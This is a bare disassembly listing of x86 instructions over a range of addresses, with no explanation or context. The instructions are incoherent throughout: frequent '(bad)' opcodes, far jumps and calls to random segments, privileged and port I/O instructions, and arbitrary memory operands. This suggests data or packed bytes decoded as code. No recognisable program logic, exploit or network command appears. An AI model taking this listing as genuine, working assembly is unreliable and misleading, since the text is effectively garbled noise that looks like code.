  410598:	or     eax,0x5c1e3053
  41059d:	lahf   
  41059e:	push   0xabacfb24
  4105a3:	jnp    0x41058f
  4105a5:	add    DWORD PTR [edi+ebp*1+0xa2ae620],edx
  4105ac:	call   0xb999:0xb7075e5e
  4105b3:	fnstsw WORD PTR [edi-0x4ab9bd1c]
  4105b9:	cmp    DWORD PTR [ebx],ebx
  4105bb:	cmp    bh,BYTE PTR ds:0x723b4ac3
  4105c1:	mov    eax,0x4e9ed4f8
  4105c6:	icebp  
  4105c7:	jmp    0x410551
  4105c9:	mov    esp,0xf3e83a7f
  4105ce:	mov    ?,ebx
  4105d0:	and    DWORD PTR [esi-0x408958ff],0xffffff86
  4105d7:	inc    ecx
  4105d8:	es push edi
  4105da:	jne    0x410594
  4105dc:	fs cmp eax,0xad2b20ce
  4105e2:	mov    esi,0xd23937f7
  4105e7:	mov    WORD PTR [ebp+0x53c2ee4],gs
  4105ed:	js     0x41063c
  4105ef:	cmp    bh,0xbe
  4105f2:	mov    ah,0x90
  4105f4:	fstp   QWORD PTR [esi]
  4105f6:	or     ecx,DWORD PTR [edx+0x5c]
  4105f9:	push   es
  4105fa:	ss mov cl,bl
  4105fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105fe:	sbb    esp,ebp
  410600:	xchg   DWORD PTR [ebx+0x65407aa7],edx
  410606:	push   ds
  410607:	lods   eax,DWORD PTR ds:[esi]
  410608:	mov    ds:0x666eeeca,al
  41060d:	loop   0x4105d5
  41060f:	call   0x9685:0xc3cb66aa
  410616:	addr16 dec ebp
  410618:	adc    dh,BYTE PTR [edi]
  41061a:	xor    ch,bh
  41061c:	mov    BYTE PTR [edi-0xb7458ce],bh
  410622:	int3   
  410623:	into   
  410624:	ret    
  410625:	pop    ss
  410626:	push   es
  410627:	mov    WORD PTR [esi-0x25c0e41],fs
  41062d:	js     0x410669
  41062f:	xchg   ecx,eax
  410630:	rol    DWORD PTR [ecx],1
  410632:	pop    ebx
  410633:	js     0x410612
  410635:	test   ebx,ecx
  410637:	les    ecx,FWORD PTR [ecx+0x34]
  41063a:	cmp    cl,BYTE PTR [ebx-0x25]
  41063d:	cld    
  41063e:	add    al,0xeb
  410640:	sbb    al,0xa4
  410642:	push   edi
  410643:	jnp    0x4105d3
  410645:	pushf  
  410646:	sbb    bl,bh
  410648:	or     BYTE PTR [eax+0x57972d52],cl
  41064e:	aad    0xb4
  410650:	(bad)  
  410651:	not    DWORD PTR [edx-0x536e0c32]
  410657:	adc    al,0x60
  410659:	jle    0x4106c5
  41065b:	and    BYTE PTR ds:0xe5436b76,bh
  410661:	adc    esi,0xffffffb8
  410664:	inc    eax
  410665:	enter  0x3c57,0x15
  410669:	test   BYTE PTR [eax-0x2],dl
  41066c:	adc    eax,0x5afde8d
  410671:	push   ebx
  410672:	or     eax,0x7f7efa9a
  410677:	or     BYTE PTR [eax],cl
  410679:	outs   dx,BYTE PTR ds:[esi]
  41067a:	idiv   DWORD PTR [ebx-0x2c]
  41067d:	adc    eax,0xeac5d58f
  410682:	inc    esi
  410683:	pop    ecx
  410684:	xchg   esp,eax
  410685:	mov    bh,0x85
  410687:	(bad)  
  410688:	mov    edi,0x3f934198
  41068d:	das    
  41068e:	ror    DWORD PTR [ebp+0x73],cl
  410691:	cli    
  410692:	fwait
  410693:	and    eax,0x6417b05a
  410698:	outs   dx,DWORD PTR ds:[esi]
  410699:	(bad)  
  41069a:	mov    al,ds:0x4c75ab97
  41069f:	and    ch,ch
  4106a1:	test   BYTE PTR [ebx+0x10fdca05],0x71
  4106a8:	mov    al,BYTE PTR [esi+eiz*2]
  4106ab:	repz retf 
  4106ad:	pop    eax
  4106ae:	cld    
  4106af:	xor    bl,BYTE PTR [ebx-0x26]
  4106b2:	adc    eax,0xaf2e66ca
  4106b7:	add    BYTE PTR [esi+edi*2+0x64048208],ch
  4106be:	adc    eax,0xf73e2c23
  4106c3:	or     BYTE PTR [ebp-0x545e39a0],dl
  4106c9:	clc    
  4106ca:	nop
  4106cb:	adc    al,BYTE PTR [eax]
  4106cd:	lock cmp al,0x0
  4106d0:	mov    bh,BYTE PTR [edx]
  4106d2:	push   ebx
  4106d3:	cdq    
  4106d4:	jl     0x41074d
  4106d6:	pop    ds
  4106d7:	inc    ebx
  4106d8:	mov    edi,0xc489a81
  4106dd:	(bad)  
  4106de:	lds    edx,FWORD PTR [ecx+0x19c136d9]
  4106e4:	sti    
  4106e5:	leave  
  4106e6:	test   eax,0x8622e236
  4106eb:	add    bl,BYTE PTR [ebp-0x7c1dec3a]
  4106f1:	inc    eax
  4106f2:	(bad)  
  4106f3:	lods   eax,DWORD PTR ss:[esi]
  4106f5:	jmp    0xa92:0xb4abd1ea
  4106fc:	fild   WORD PTR [ecx]
  4106fe:	leave  
  4106ff:	out    dx,al
  410700:	cmc    
  410701:	adc    ebx,ebx
  410703:	and    DWORD PTR [ebx-0x3ca08855],0x1ad10798
  41070d:	jmp    0x729:0xe67f3e1d
  410714:	popf   
  410715:	mov    esi,0x9ffe5fc5
  41071a:	add    al,0x5c
  41071c:	(bad)  
  41071d:	inc    edi
  41071e:	(bad)  
  41071f:	ror    eax,cl
  410721:	push   0x504e84f8
  410726:	adc    DWORD PTR [eax-0x10],eax
  410729:	or     esp,DWORD PTR cs:[esi-0x2ea8db49]
  410730:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410731:	mov    ?,WORD PTR [ebx+0x35]
  410734:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410735:	mov    ecx,0x372ee25f
  41073a:	test   eax,0x4404c952
  41073f:	pop    es
  410740:	xor    al,0xa3
  410742:	push   ds
  410743:	inc    esi
  410744:	mov    ecx,0x6bd6a53b
  410749:	dec    esi
  41074a:	stos   BYTE PTR es:[edi],al
  41074b:	jg     0x410711
  41074d:	inc    eax
  41074e:	pop    esp
  41074f:	aaa    
  410750:	dec    edi
  410751:	mov    edi,0x2c8c3d1e
  410756:	inc    esi
  410757:	xor    BYTE PTR [esi],0x16
  41075a:	ret    
  41075b:	add    eax,0x3e4015ce
  410760:	sbb    DWORD PTR [ecx+0xefe710a],edx
  410766:	scas   al,BYTE PTR es:[edi]
  410767:	pop    ebx
  410768:	or     DWORD PTR [edi],ebx
  41076a:	test   DWORD PTR [ebx],eax
  41076c:	lds    ebx,FWORD PTR [ebp+eax*1+0x55]
  410770:	sbb    al,0xdf
  410772:	les    eax,FWORD PTR [esi-0x415039e4]
  410778:	sub    esi,DWORD PTR [esi]
  41077a:	data16 jecxz 0x410723
  41077d:	arpl   WORD PTR [ecx-0x49c63609],ax
  410783:	jne    0x4107c9
  410785:	fist   DWORD PTR [ecx-0x3]
  410788:	into   
  410789:	das    
  41078a:	sbb    BYTE PTR [edi],ch
  41078c:	push   esi
  41078d:	pusha  
  41078e:	fwait
  41078f:	push   ebp
  410790:	mov    WORD PTR [edi+0x18],ss
  410793:	cli    
  410794:	mov    ds:0xaeec79d1,al
  410799:	fisttp WORD PTR [edi+eax*4+0x29]
  41079d:	ss in  al,0x83
  4107a0:	out    dx,al
  4107a1:	cmp    eax,0x9e9e58b2
  4107a6:	dec    ebx
  4107a7:	dec    eax
  4107a8:	outs   dx,BYTE PTR ds:[esi]
  4107a9:	mov    ds:0x7fca1ff7,eax
  4107ae:	cmp    esi,DWORD PTR [ebx+0x74]
  4107b1:	pop    ebp
  4107b2:	sbb    eax,0x9fc8114a
  4107b7:	cmp    al,dh
  4107b9:	nop
  4107ba:	loope  0x41080f
  4107bc:	out    0x3f,al
  4107be:	scas   eax,DWORD PTR es:[edi]
  4107bf:	xchg   ebx,eax
  4107c0:	mov    cl,0x7a
  4107c2:	je     0x410778
  4107c4:	scas   al,BYTE PTR es:[edi]
  4107c5:	call   0xc893fb31
  4107ca:	jl     0x4107d4
  4107cc:	(bad)  
  4107cd:	mov    edx,0x202a23a4
  4107d2:	nop
  4107d3:	jge    0x410786
  4107d5:	imul   edi,DWORD PTR gs:[edx],0x61
  4107d9:	or     BYTE PTR [ecx],dl
  4107db:	fld    st(4)
  4107dd:	mov    DWORD PTR [edx],ebp
  4107df:	outs   dx,DWORD PTR ds:[esi]
  4107e0:	dec    ecx
  4107e1:	(bad)  
  4107e2:	adc    esi,ecx
  4107e4:	pop    ebp
  4107e5:	or     BYTE PTR [ebp+0x226bc168],bl
  4107eb:	cdq    
  4107ec:	inc    edi
  4107ed:	push   edx
  4107ee:	or     bl,al
  4107f0:	cs retf 0xe69f
  4107f4:	cwde   
  4107f5:	push   es
  4107f6:	movsx  edi,WORD PTR [edi-0x43]
  4107fa:	add    esp,ebx
  4107fc:	inc    esi
  4107fd:	xchg   ebx,eax
  4107fe:	xor    DWORD PTR [edx+0x72139a1f],ecx
  410804:	imul   BYTE PTR [esi-0x7cbcf1c1]
  41080a:	test   DWORD PTR [ecx],eax
  41080c:	inc    ebx
  41080d:	mov    ebx,0xb4a9500f
  410812:	mov    BYTE PTR [edx+0x6a],dh
  410815:	mov    esp,0xbde08817
  41081a:	and    DWORD PTR [ecx+ebp*4+0x60cd90e8],eax
  410821:	inc    eax
  410822:	and    BYTE PTR [edx-0x7364ed49],dh
  410828:	push   0x48c87370
  41082d:	or     al,0x50
  41082f:	in     al,dx
  410830:	pusha  
  410831:	push   ss
  410832:	and    bh,BYTE PTR [edx+ecx*1-0x46833e0c]
  410839:	and    eax,0x6218575f
  41083e:	dec    ebx
  41083f:	and    ebp,DWORD PTR [esi]
  410841:	xor    edx,edx
  410843:	cld    
  410844:	cmp    bh,BYTE PTR [edx-0x370c5341]
  41084a:	ja     0x41080c
  41084c:	repz fadd st(6),st
  41084f:	push   cs
  410850:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410851:	jns    0x410846
  410853:	pop    eax
  410854:	and    eax,0x9276ffbc
  410859:	mov    ah,0x35
  41085b:	jmp    0x8c5b3d7f
  410860:	mov    edx,ebx
  410862:	jg     0x410801
  410864:	dec    esi
  410865:	nop
  410866:	loope  0x410841
  410868:	scas   al,BYTE PTR es:[edi]
  410869:	push   ds
  41086a:	xor    BYTE PTR [ecx],0x73
  41086d:	fdiv   QWORD PTR [esi]
  41086f:	pop    ss
  410870:	cmp    ebp,edi
  410872:	jne    0x41086e
  410874:	leave  
  410875:	loope  0x410887
  410877:	jno    0x41087e
  410879:	fwait
  41087a:	pop    ds
  41087b:	or     al,BYTE PTR [esi-0x47515d43]
  410881:	test   eax,0x1865ba8e
  410886:	lea    ebp,[ecx-0x79]
  410889:	retf   
  41088a:	sub    dh,BYTE PTR [eax-0xe]
  41088d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41088e:	scas   eax,DWORD PTR es:[edi]
  41088f:	or     al,0x54
  410891:	xor    eax,0xc213d350
  410896:	xchg   ecx,eax
  410897:	and    al,0xbb
  410899:	fsubrp st(7),st
  41089b:	test   al,0xf9
  41089d:	fwait
  41089e:	in     al,dx
  41089f:	push   es
  4108a0:	and    eax,0xa2e67286
  4108a5:	pop    es
  4108a6:	push   esi
  4108a7:	gs mov bl,0x9c
  4108aa:	cmc    
  4108ab:	mov    esi,0x10eb59
  4108b0:	aam    0x9e
  4108b2:	jmp    0x4108cf
  4108b4:	enter  0xce8a,0x4f
  4108b8:	(bad)  
  4108b9:	jmp    0x4108ea
  4108bb:	or     BYTE PTR [edi],0x37
  4108be:	add    dl,ah
  4108c0:	jb     0x410914
  4108c2:	test   al,0xf0
  4108c4:	imul   edx,DWORD PTR [edx+0x1045faf0],0xa6a3f5ba
  4108ce:	xchg   DWORD PTR [esi-0x19c0c4b0],ebx
  4108d4:	(bad)  
  4108d5:	shl    DWORD PTR [ecx-0x53],1
  4108d8:	or     al,0xb6
  4108da:	push   ecx
  4108db:	or     bl,dl
  4108dd:	imul   edx,DWORD PTR [esi],0xdf11e704
  4108e3:	rol    cl,cl
  4108e5:	push   0xffffff8f
  4108e7:	push   0x49
  4108e9:	into   
  4108ea:	push   0xcc52df46
  4108ef:	xchg   BYTE PTR [ebp-0x1c],ah
  4108f2:	pop    es
  4108f3:	push   eax
  4108f4:	sti    
  4108f5:	fmulp  st(0),st
  4108f7:	int    0xcd
  4108f9:	xor    DWORD PTR [edx-0x4b],esi
  4108fc:	bound  edi,QWORD PTR [ebx-0xedb170b]
  410902:	std    
  410903:	shl    BYTE PTR [edi+ecx*8+0x42b02f15],1
  41090a:	cmp    edi,eax
  41090c:	ja     0x4108a3
  41090e:	and    al,0x96
  410910:	enter  0xdcca,0x1c
  410914:	jne    0x410915
  410916:	clc    
  410917:	cld    
  410918:	test   DWORD PTR [ebp-0x3c614d3b],edi
  41091e:	cmp    eax,0x2bb7fdbb
  410923:	fwait
  410924:	xchg   ebx,eax
  410925:	pop    es
  410926:	outs   dx,BYTE PTR ds:[esi]
  410927:	stos   BYTE PTR es:[edi],al
  410928:	cli    
  410929:	sub    BYTE PTR [ebp-0x59a72abb],bl
  41092f:	mov    ds:0xfc0e4f91,al
  410934:	cmp    bl,BYTE PTR [ebp+0x1fbdc11c]
  41093a:	(bad)  
  41093b:	mov    eax,ds:0x9337d956
  410940:	(bad)  
  410941:	not    DWORD PTR [esi+0x72632ad2]
  410947:	sbb    al,BYTE PTR [ebx+edi*8]
  41094a:	xchg   edx,eax
  41094b:	mov    cl,0x8f
  41094d:	xchg   DWORD PTR [edi-0x3d6ff8c0],esi
  410953:	jecxz  0x410921
  410955:	(bad)  
  410956:	out    0xce,al
  410958:	scas   al,BYTE PTR es:[edi]
  410959:	sub    esp,DWORD PTR [eax]
  41095b:	lea    edi,[esi+0x1f92014e]
  410961:	jp     0x41099f
  410963:	mov    ch,BYTE PTR [edi-0x63]
  410966:	ret    
  410967:	add    ebx,0x4f
  41096a:	add    ecx,DWORD PTR [ebp+0xd]
  41096d:	mov    dl,0xff
  41096f:	(bad)  
  410971:	cwde   
  410972:	push   0xc5e5f19
  410977:	stc    
  410978:	mov    dl,0x47
  41097a:	fcomi  st,st(0)
  41097c:	jge    0x410994
  41097e:	adc    al,0xa3
  410980:	push   cs
  410981:	fnstsw WORD PTR [edx-0x4eb17caa]
  410987:	test   DWORD PTR ds:0x6072d292,ebp
  41098d:	dec    ebp
  41098e:	imul   ebx,DWORD PTR [ecx+ebp*4+0x4448960f],0xffffff84
  410996:	mov    dh,0x8
  410998:	sub    eax,0x3de7493
  41099d:	and    esi,DWORD PTR [ebx+0x64]
  4109a0:	in     eax,0xc3
  4109a2:	ficomp WORD PTR [edx+0x508d18f6]
  4109a8:	ss push esp
  4109aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109ab:	fwait
  4109ac:	mov    eax,ds:0xadd71e6a
  4109b1:	xor    al,0x65
  4109b3:	add    al,0xa7
  4109b5:	inc    ebp
  4109b6:	loope  0x41098a
  4109b8:	push   esi
  4109b9:	adc    eax,0xe1e402cc
  4109be:	xor    BYTE PTR [ebx],dh
  4109c0:	dec    esi
  4109c1:	jae    0x410989
  4109c3:	(bad)  
  4109c4:	mov    ecx,edi
  4109c6:	dec    esi
  4109c7:	pop    edi
  4109c8:	and    ebp,DWORD PTR [esi]
  4109ca:	dec    ebx
  4109cb:	mov    al,0x2
  4109cd:	hlt    
  4109ce:	mov    ch,BYTE PTR [edx]
  4109d0:	loop   0x4109ff
  4109d2:	jmp    0x96c4:0x5b9c7818
  4109d9:	lahf   
  4109da:	xchg   edx,eax
  4109db:	sub    al,0x10
  4109dd:	stos   BYTE PTR es:[edi],al
  4109de:	mov    WORD PTR [eax],es
  4109e0:	sub    dl,bl
  4109e2:	sub    bh,BYTE PTR [ecx]
  4109e4:	mov    al,ds:0xc4c332d2
  4109e9:	and    al,0xa6
  4109eb:	scas   al,BYTE PTR es:[edi]
  4109ec:	adc    ch,bl
  4109ee:	outs   dx,BYTE PTR ds:[esi]
  4109ef:	mov    edx,0x788df2c6
  4109f4:	push   eax
  4109f5:	repnz push ecx
  4109f7:	clc    
  4109f8:	jg     0x4109c8
  4109fa:	xor    DWORD PTR [ebp+0x19],eax
  4109fd:	sub    BYTE PTR [edx-0x127baede],cl
  410a03:	loopne 0x4109dc
  410a05:	push   ebx
  410a06:	push   0xf9ac3d8a
  410a0b:	out    dx,eax
  410a0c:	push   0x6b
  410a0e:	push   esi
  410a0f:	inc    eax
  410a10:	jmp    0xb0167f4c
  410a15:	pop    es
  410a16:	and    DWORD PTR [esi-0x3353cccc],ebp
  410a1c:	jne    0x410a6e
  410a1e:	mov    edx,0xe8223cfb
  410a23:	mov    DWORD PTR [edi],ebx
  410a25:	mov    esi,0xe69c2684
  410a2a:	sbb    dh,BYTE PTR [ebp-0xdfa1cb4]
  410a30:	or     al,0xb3
  410a32:	pop    ecx
  410a33:	jmp    0x3b53adec
  410a38:	sub    edx,DWORD PTR [edx+ecx*1]
  410a3b:	push   ss
  410a3c:	and    al,0xc5
  410a3e:	push   ebx
  410a3f:	ret    0xaee0
  410a42:	jns    0x410a5f
  410a44:	jo     0x410a6d
  410a46:	outs   dx,BYTE PTR ds:[esi]
  410a47:	addr16 sbb al,0x32
  410a4a:	scas   al,BYTE PTR es:[edi]
  410a4b:	sti    
  410a4c:	test   eax,0x21c2001f
  410a51:	push   0xffffff97
  410a53:	cdq    
  410a54:	add    dh,BYTE PTR [ebp+0x74]
  410a57:	cmp    DWORD PTR [edi-0x26884754],0xffffff9d
  410a5e:	xor    bh,bh
  410a60:	xor    DWORD PTR [ebp+0x95592a0],esi
  410a66:	bound  edx,QWORD PTR [edx]
  410a68:	or     ch,bh
  410a6a:	aaa    
  410a6b:	rcr    dl,0x30
  410a6e:	test   eax,0x58f27043
  410a73:	stos   DWORD PTR es:[edi],eax
  410a74:	xor    BYTE PTR [esi-0x273d53ef],ch
  410a7a:	test   BYTE PTR [ecx+0x4c],cl
  410a7d:	popf   
  410a7e:	xchg   esi,eax
  410a7f:	jns    0x410ae9
  410a81:	imul   esp,DWORD PTR [esi],0x1c
  410a84:	add    dl,BYTE PTR [ebx]
  410a86:	pop    ds
  410a87:	les    ecx,FWORD PTR [ebp+0x4f]
  410a8a:	mov    eax,ds:0x3274ab0d
  410a8f:	inc    ebx
  410a90:	jbe    0x410af4
  410a92:	mov    edi,esi
  410a94:	cmp    eax,0xe7ba8c2e
  410a99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a9a:	cld    
  410a9b:	popf   
  410a9c:	int3   
  410a9d:	jg     0x410a84
  410a9f:	cmp    DWORD PTR [ecx+0x44f61121],0x6dbda6b8
  410aa9:	repz ficom WORD PTR [edx+0x4dea0a48]
  410ab0:	jno    0x410a4e
  410ab2:	aas    
  410ab3:	push   ss
  410ab4:	xchg   ebx,eax
  410ab5:	pop    esp
  410ab6:	cmp    eax,0x7c6fe80e
  410abb:	pop    esi
  410abc:	ret    0x1ef3
  410abf:	or     eax,0x3bbfec6b
  410ac4:	mov    eax,0xff82891d
  410ac9:	and    BYTE PTR [esp+edx*8+0x7f5d29e],cl
  410ad0:	mov    bh,0x3c
  410ad2:	(bad)  
  410ad4:	mov    ds:0x213d96b4,eax
  410ad9:	pop    esi
  410ada:	imul   edi,DWORD PTR [ecx+0x4f3c17ca],0xdb8fe24d
  410ae4:	push   ebx
  410ae5:	push   ebx
  410ae6:	sub    al,0x72
  410ae8:	push   ds
  410ae9:	addr16 call 0xaa06b11
  410aef:	in     al,0xf1
  410af1:	aaa    
  410af2:	js     0x410b66
  410af4:	ror    BYTE PTR [ecx-0x3d],1
  410af7:	mov    ds:0xc8daeaf6,al
  410afc:	mov    ds:0xb0eb2359,eax
  410b01:	test   DWORD PTR [esi-0x29cef06b],ebx
  410b07:	stos   DWORD PTR es:[edi],eax
  410b08:	(bad)  
  410b09:	arpl   WORD PTR [ecx-0x2a],bx
  410b0c:	dec    esp
  410b0d:	sbb    eax,esi
  410b0f:	pusha  
  410b10:	addr16 jle 0x410b3c
  410b13:	cmp    ecx,DWORD PTR [eax-0x60499f89]
  410b19:	fadd   st,st(7)
  410b1b:	adc    dh,BYTE PTR [ecx]
  410b1d:	sub    bh,BYTE PTR [ebx]
  410b1f:	mov    ds:0xdfd4ce7d,eax
  410b24:	test   BYTE PTR ds:0x37747ef9,al
  410b2a:	into   
  410b2b:	aam    0xab
  410b2d:	loope  0x410b51
  410b2f:	sahf   
  410b30:	fwait
  410b31:	into   
  410b32:	ret    
  410b33:	rcr    DWORD PTR [edx-0x3f],0x8f
  410b37:	data16 test al,0xfe
  410b3a:	and    eax,0xb645ecd5
  410b3f:	xchg   BYTE PTR [ebx],dl
  410b41:	sbb    eax,0x6bcadc77
  410b46:	mov    ebp,ecx
  410b48:	int3   
  410b49:	mov    edx,0xc20755ee
  410b4e:	sub    dl,BYTE PTR [ecx]
  410b50:	je     0x410b06
  410b52:	ss dec eax
  410b54:	jge    0x410b0f
  410b56:	lock jl 0x410b5a
  410b59:	push   0x79a864f2
  410b5e:	sti    
  410b5f:	mov    ch,0x1a
  410b61:	mov    bl,0x5e
  410b63:	inc    esi
  410b64:	inc    esp
  410b65:	dec    edi
  410b66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b67:	inc    edi
  410b68:	aad    0xdc
  410b6a:	stos   BYTE PTR es:[edi],al
  410b6b:	push   ebp
  410b6c:	xchg   esp,eax
  410b6d:	dec    edi
  410b6e:	adc    eax,0xf57c215e
  410b73:	leave  
  410b74:	popf   
  410b75:	mov    esp,0xae58116f
  410b7a:	jge    0x410ba3
  410b7c:	add    ecx,edx
  410b7e:	fisttp WORD PTR [edx-0x22]
  410b81:	xchg   esp,eax
  410b82:	and    ch,BYTE PTR [ebp-0x7bb9abe7]
  410b88:	mov    ebp,0xd8054065
  410b8d:	dec    ecx
  410b8e:	inc    edi
  410b8f:	std    
  410b90:	sbb    edx,DWORD PTR [ebx+ebp*8]
  410b93:	jno    0x410ba9
  410b95:	loop   0x410c10
  410b97:	or     al,BYTE PTR [eax-0x3b]
  410b9a:	and    al,0x5c
  410b9c:	loope  0x410b8f
  410b9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b9f:	rcr    cl,cl
  410ba1:	xor    DWORD PTR ds:0x4975a06a,ecx
  410ba7:	jo     0x410b8d
  410ba9:	test   BYTE PTR [ebx-0x3f1be2d8],dl
  410baf:	mov    DWORD PTR [edi+0x58],ecx
  410bb2:	aad    0x1a
  410bb4:	sti    
  410bb5:	push   ds
  410bb6:	mov    cl,0x27
  410bb8:	jge    0x410bad
  410bba:	(bad)  
  410bbc:	inc    DWORD PTR [esi-0x5b9c41a3]
  410bc2:	mov    fs,WORD PTR [esi]
  410bc4:	inc    edx
  410bc5:	jo     0x410bec
  410bc7:	sahf   
  410bc8:	add    dl,BYTE PTR [edi+0x195914ca]
  410bce:	inc    ebx
  410bcf:	and    esp,DWORD PTR [eax+0x8561037]
  410bd5:	repz daa 
  410bd7:	cmp    esi,ebx
  410bd9:	dec    ecx
  410bda:	jae    0x410c08
  410bdc:	cmp    eax,0x11
  410bdf:	stos   BYTE PTR es:[edi],al
  410be0:	push   eax
  410be1:	sub    DWORD PTR [edi+0x3148b66a],edi
  410be7:	pushf  
  410be8:	sub    eax,0xdc12d976
  410bed:	(bad)  
  410bee:	cli    
  410bef:	add    DWORD PTR [eax-0x693483bd],esi
  410bf5:	sbb    esi,DWORD PTR [eax+0x68]
  410bf8:	cmp    bl,bl
  410bfa:	mul    DWORD PTR [ebx-0x1e]
  410bfd:	mov    BYTE PTR [edx+ecx*1],0x8a
  410c01:	or     edi,eax
  410c03:	scas   eax,DWORD PTR es:[edi]
  410c04:	cmp    edi,DWORD PTR [ecx+0x674cf3c9]
  410c0a:	lock sti 
  410c0c:	cmp    al,0xdf
  410c0e:	cmp    al,0x9d
  410c10:	call   0xf2523b2
  410c15:	inc    ebp
  410c16:	les    ecx,FWORD PTR [ebx]
  410c18:	or     al,0x4f
  410c1a:	loopne 0x410c91
  410c1c:	xor    BYTE PTR [esi+ebp*4],0xa6
  410c20:	int    0x1a
  410c22:	sbb    DWORD PTR [edi-0x55],eax
  410c25:	jo     0x410c57
  410c27:	sub    al,0x7b
  410c29:	xor    eax,0xc3c3660
  410c2e:	sub    eax,0x4b7adec
  410c33:	scas   eax,DWORD PTR es:[edi]
  410c34:	jg     0x410bd6
  410c36:	adc    DWORD PTR [esp+edx*2-0x33],ecx
  410c3a:	loopne 0x410c23
  410c3c:	test   BYTE PTR [edx+0x300b73ff],bl
  410c42:	test   eax,0x728049cd
  410c47:	mov    al,gs:0xf2e6b6b3
  410c4d:	aad    0x7e
  410c4f:	(bad)  
  410c50:	xor    DWORD PTR [edi],edx
  410c52:	das    
  410c53:	fmul   st,st(2)
  410c55:	imul   ebx,DWORD PTR [edx+0x5a6b852d],0xb6ab2e83
  410c5f:	scas   al,BYTE PTR es:[edi]
  410c60:	xlat   BYTE PTR ds:[ebx]
  410c61:	(bad)  
  410c62:	repnz xor eax,0xc8804f74
  410c68:	loope  0x410c34
  410c6a:	and    dh,BYTE PTR [edx+ebp*2-0x248d56be]
  410c71:	(bad)  
  410c72:	ror    esp,1
  410c74:	fs mov edx,0xedefa9ac
  410c7a:	dec    eax
  410c7b:	stc    
  410c7c:	mov    bh,0x74
  410c7e:	lahf   
  410c7f:	(bad)  
  410c80:	stos   BYTE PTR es:[edi],al
  410c81:	inc    ecx
  410c82:	inc    edi
  410c83:	push   ds
  410c84:	scas   eax,DWORD PTR es:[edi]
  410c85:	lods   al,BYTE PTR ds:[esi]
  410c86:	jmp    0x50276053
  410c8b:	adc    BYTE PTR [esi],bl
  410c8d:	push   eax
  410c8e:	jecxz  0x410c35
  410c90:	jb     0x410c30
  410c92:	aas    
  410c93:	xchg   esi,eax
  410c94:	xchg   esi,eax
  410c95:	fdiv   DWORD PTR [edx-0x1fb7e49c]
  410c9b:	push   ss
  410c9c:	adc    edi,esp
  410c9e:	es stos DWORD PTR es:[edi],eax
  410ca0:	xchg   edi,eax
  410ca1:	pop    esi
  410ca2:	scas   al,BYTE PTR es:[edi]
  410ca3:	lahf   
  410ca4:	std    
  410ca5:	jge    0x410c3f
  410ca7:	pushf  
  410ca8:	jo     0x410c53
  410caa:	adc    eax,0x70c1cabb
  410caf:	les    esi,FWORD PTR [esi+ecx*8]
  410cb2:	(bad)  
  410cb3:	sbb    DWORD PTR [ecx-0x13b0eb7a],esp
  410cb9:	xor    eax,0xb862d721
  410cbe:	inc    esi
  410cbf:	pop    ss
  410cc0:	out    dx,al
  410cc1:	retf   0x6164
  410cc4:	add    ebp,DWORD PTR [edx-0x43c68ad5]
  410cca:	sbb    al,0x50
  410ccc:	mov    esi,0x807b9151
  410cd1:	stos   BYTE PTR es:[edi],al
  410cd2:	popa   
  410cd3:	dec    ebx
  410cd4:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cd6:	push   edi
  410cd7:	xor    DWORD PTR [ebx-0x1b],ebx
  410cda:	fidivr WORD PTR [eax+0x12]
  410cdd:	or     eax,0x182ac7fc
  410ce2:	mov    ecx,0x1171e9ed
  410ce7:	icebp  
  410ce8:	(bad)
  410ceb:	sbb    BYTE PTR [edi+0x524164a3],dl
  410cf1:	nop
  410cf2:	pop    ds
  410cf3:	stc    
  410cf4:	mov    edi,0xba1b0b49
  410cf9:	out    dx,eax
  410cfa:	xchg   BYTE PTR [ebp+0x3f210af7],dh
  410d00:	int    0x9b
  410d02:	pop    eax
  410d03:	and    bl,ch
  410d05:	cmc    
  410d06:	mov    ebp,0x58c6a501
  410d0b:	fist   WORD PTR fs:[esi]
  410d0e:	pop    ds
  410d0f:	jl     0x410c92
  410d11:	sbb    eax,0xa3c837db
  410d16:	cmp    DWORD PTR [ebx],eax
  410d18:	ins    DWORD PTR es:[edi],dx
  410d19:	fdivr  QWORD PTR [ebp+0x4029cae3]
  410d1f:	fs fmulp st(4),st
  410d22:	inc    edi
  410d23:	jne    0x410d70
  410d25:	dec    edx
  410d26:	repz mov al,0x6d
  410d2a:	dec    ebp
  410d2b:	ja     0x410cbb
  410d2d:	mov    ch,0xb2
  410d2f:	add    eax,0xae65260f
  410d34:	ret    
  410d35:	cwde   
  410d36:	mov    DWORD PTR [eax-0x30],esi
  410d39:	fwait
  410d3a:	stc    
  410d3b:	xor    ebp,DWORD PTR [ebx+0x19]
  410d3e:	jns    0x410cef
  410d40:	pop    ecx
  410d41:	pop    esi
  410d42:	ss push ds
  410d44:	pop    ebx
  410d45:	mov    WORD PTR [ebx-0x46ae1281],cs
  410d4b:	ins    BYTE PTR es:[edi],dx
  410d4c:	push   eax
  410d4d:	mov    ds:0x44aa1928,al
  410d52:	xchg   ebp,eax
  410d53:	sbb    ebp,DWORD PTR [eax+0x11]
  410d56:	call   0xeda7128e
  410d5b:	jle    0x410db6
  410d5d:	shr    BYTE PTR [ecx],0x52
  410d60:	sahf   
  410d61:	push   ebp
  410d62:	push   0x4a
  410d64:	mov    ds:0x7c698ffd,eax
  410d69:	pop    ecx
  410d6a:	mov    BYTE PTR ds:0x40cc25fa,dh
  410d70:	sbb    al,0x5b
  410d72:	push   cs
  410d73:	fdivr  QWORD PTR [edx]
  410d75:	out    0xd3,eax
  410d77:	in     al,0xd0
  410d79:	iret   
  410d7a:	or     al,0x51
  410d7c:	and    eax,esi
  410d7e:	pop    esi
  410d7f:	arpl   WORD PTR [edx],cx
  410d81:	mov    eax,ds:0x8d06e085
  410d86:	mov    WORD PTR [edx-0x1e92cae5],fs
  410d8c:	pop    esi
  410d8d:	adc    al,0x5a
  410d8f:	xor    DWORD PTR [eax-0x33],eax
  410d92:	mov    al,0xbf
  410d94:	out    0xfd,al
  410d96:	mov    esp,0x11bccda
  410d9b:	shr    DWORD PTR [edi],0x51
  410d9e:	(bad)  
